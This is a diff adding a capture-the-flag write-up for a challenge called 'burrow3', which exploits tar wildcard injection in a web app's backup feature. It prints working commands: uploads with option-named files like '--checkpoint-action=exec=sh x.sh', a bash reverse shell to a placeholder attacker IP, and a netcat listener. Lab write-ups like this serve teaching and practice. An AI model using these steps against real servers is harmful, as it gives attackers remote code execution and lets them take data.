@@ -79,3 +79,69 @@ cookie by using the code at `/debug/source` as reference
    ```
 
 **Note**: It's obviously possible to do this without a reverse shell, but where's the fun in that :P
+
+---
+
+## burrow3 - Burrow Backup (tar wildcard injection, Hard)
+
+TLDR: The "Back up my uploads" button runs `tar czf ... *` in the upload dir.
+GNU tar treats option-looking filenames as options, so an uploaded file named
+`--checkpoint-action=exec=sh x.sh` makes tar execute a script we also uploaded -
+RCE as `burrow`.
+
+There are _two_ valid ways to solve this CTF. The first involves a reverse shell
+and the second is placing the flag in the upload directory, which will then
+get included in the downloadable backup tarball.
+
+**Steps**
+
+1. Browse to `http://<host>:8003/`. Note the upload form and the "Back up my
+   uploads" button. Uploaded files should be listed here.
+
+2. Write a payload script `x.sh`. Two possible solutions here:
+
+   ```bash
+   # Path A (reverse shell)
+   echo "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" > x.sh
+
+   # Path B (no listener): copy the flag where the next backup will archive it
+   echo 'cp /home/burrow/flag.txt /app/uploads/big-loot.txt' > x.sh
+   ```
+
+3. Upload three files - the script, and the two tar-option filenames (the empty
+   files just need to _exist_ under those names):
+
+   ```bash
+   curl -F 'f=@x.sh;filename=x.sh'                                   http://<host>:8003/upload
+   curl -F 'f=@/dev/null;filename=--checkpoint=1'                    http://<host>:8003/upload
+   curl -F 'f=@/dev/null;filename=--checkpoint-action=exec=sh x.sh'  http://<host>:8003/upload
+   ```
+
+   This sets up the following command to be run when the backup is triggered:
+
+   ```bash
+   tar czf /app/backups/backup.tgz --checkpoint-action=exec=sh x.sh --checkpoint=1 x.sh # and whatever other files you may have uploaded are appended
+   ```
+
+   > **NOTE**: If you paste exact command into the terminal, the shell will split the arguments on spaces
+   > which will result in the `checkpoint-action` argument getting split into two arguments. The whole
+   > reason why this actually works is because glob expansion does not undergo word splitting, so the
+   > argument is passed, space and all, to tar. This is the heart of the exploit. Pretty neat!
+
+4. Trigger the backup. tar globs the upload dir, hits the checkpoint options, and
+   runs `sh x.sh` as `burrow`:
+
+   ```bash
+   curl -X POST http://<host>:8003/backup
+   ```
+
+   - **Path A:** have `nc -lvnp 4444` ready first; catch the shell and
+     `cat /home/burrow/flag.txt`. Done.
+   - **Path B:** the flag is now at `/app/uploads/big-loot.txt`. Run the backup once
+     more so it gets archived, then download and extract:
+
+     ```bash
+     curl -X POST http://<host>:8003/backup      # re-archive, now includes big-loot.txt
+     curl -s http://<host>:8003/download -o out.tgz
+     tar xf out.tgz -O big-loot.txt                 # the flag
+     ```
